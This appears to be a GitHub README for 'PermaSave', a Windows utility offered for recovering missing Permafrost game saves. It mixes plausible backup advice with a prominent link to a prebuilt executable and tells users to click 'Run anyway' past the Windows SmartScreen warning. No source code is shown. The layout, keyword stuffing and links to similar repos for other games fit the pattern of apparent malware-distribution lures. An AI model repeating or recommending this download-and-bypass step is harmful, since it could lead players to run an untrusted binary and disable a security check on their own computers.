# Permafrost Save Backup — Missing Worlds, Save Files and Recovery on Windows

<p align="center">
  <img src="https://i.postimg.cc/7hjHCLnm/banner.png" alt="Permafrost — Save Guard for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Recovery%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-perma--guard--2.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · Permafrost · Save and troubleshooting documentation**

If a *Permafrost* world stops appearing, resist the temptation to recreate it immediately. The developers maintain a **BackupSaves** folder and have published advice for players whose saves stop updating. The useful first question is not “which optimizer should I run?” but “is there an older copy of this world that is still readable?”

A November 9 update fixed an issue involving special characters in save names, alongside other save-related bugs. Keep the game updated before investigating an older symptom. This page covers **Permafrost missing saves**, **world backup** and safe review of local recovery options.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| World disappears from the selection menu | Corrupted active `.pfs` save or special-character bug (fixed Nov 9) | Update to Nov 9+ Steam build and check `%LOCALAPPDATA%\Permafrost\BackupSaves` |
| Game loads an earlier checkpoint than last save | Active save write interrupted or Steam Cloud synced older file | Copy `%LOCALAPPDATA%\Permafrost\BackupSaves` to Documents before restoring |
| Unsure which backup file holds latest progress | Multiple timestamped snapshots inside `BackupSaves` | Compare `.pfs` file sizes and modification dates before copying |
| Steam Cloud overwrites local recovery attempt | Cloud sync replaces manually restored file on launch | Keep separate offline copies before resolving Steam Cloud prompts |

## Download for Windows

[**Download PermaSave.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/PermaSave.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `PermaSave.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Permafrost\BackupSaves` and `SaveGame` folders automatically.
- Lists all `.pfs` world files and backup snapshots with exact sizes and modification timestamps.
- Flags `0 KB` or corrupted save headers before you overwrite an active slot.
- Helps you archive a clean backup copy outside `%LOCALAPPDATA%`.

### Sample Diagnostic Output

```text
[PermaSave] Scanning Permafrost LocalAppData save & backup folders...
[OK]   AppData Root     : C:\Users\Player\AppData\Local\Permafrost
[OK]   SaveGame Folder  : 2 active .pfs worlds (Latest: WinterCamp.pfs - 3.8 MB)
[OK]   BackupSaves      : 6 automatic backup snapshots found
[INFO] Integrity Check  : All .pfs files > 0 KB
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `PermaSave.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **PermaSave.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **PermaSave.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- A world no longer appears in the selection menu.
- The game loads an earlier point than the last save.
- A backup file exists but it is unclear which one contains the right progress.
- Saving or loading fails following an update or a name change.

## Before changing anything

Close Permafrost. In File Explorer, open:

`%LOCALAPPDATA%\Permafrost\BackupSaves`

This is the backup directory named in the developer's known-issues post. Copy any candidate backups to a separate folder before attempting restoration. If you have both local and Steam Cloud copies, preserve them separately and label which machine or profile each came from. Avoid repeatedly renaming game files while cloud sync is active.

## What to check

Check which saved worlds still appear in-game, then compare them to files in `BackupSaves`. Make a record of names and modification dates. The developer also references a `SaveGame` folder and `.pfs` world files in its troubleshooting notes. Do not assume that copying a backup into an active save slot is safe until you have identified the matching world and kept an independent copy.

The November 9 patch addressed certain naming problems. If the game is patched but the world still fails to load, preserve logs and the affected save for the official support team rather than experimenting on the last surviving copy.

## What this project covers

**Permafrost SaveGuard** is intended for backup discovery and controlled recovery, not editing character inventory, repairing every broken quest or circumventing Steam Cloud. Some save problems originate inside the game and require a developer patch.

## Troubleshooting

### BackupSaves folder is empty

Check the correct Windows user account and any backups created outside the game; there may be nothing available to restore.

### World disappeared after renaming

Update the game and preserve the original file. Avoid unusual punctuation in names while diagnosing historical saves.

### Steam Cloud replaced local progress

Keep both candidate copies before using Steam’s conflict-resolution controls. Do not overwrite the newer file just because its name looks familiar.

## Frequently asked questions

**Does Permafrost keep its own backup saves?**

Yes. The developer documents a BackupSaves location under LocalAppData.

**Can I restore an invalid .pfs file?**

Not necessarily. A usable earlier copy is required; a damaged file may need developer assistance.

**Do you change the game executable?**

No. Save review should not involve altering the game executable or security settings.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Developer: Known Issues and Workarounds](https://steamcommunity.com/app/2254990/discussions/0/588440207635776246/)
- [November 9 patch notes](https://steamdb.info/patchnotes/26485041/)
- [Permafrost on Steam](https://store.steampowered.com/app/2254990/)

## More Windows Game Diagnostic Tools

- [Dreadmoor-SaveCheck](../Dreadmoor-SaveCheck) — DREADMOOR missing save & progress rollback diagnostics
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers `MoonSessions` backup & version guard
- [OverTheHill-SaveLocator](../OverTheHill-SaveLocator) — over the hill save-location migration & OneDrive check
- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 world & dedicated server save backups

## Disclaimer

This is an independent community project for Permafrost players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
 
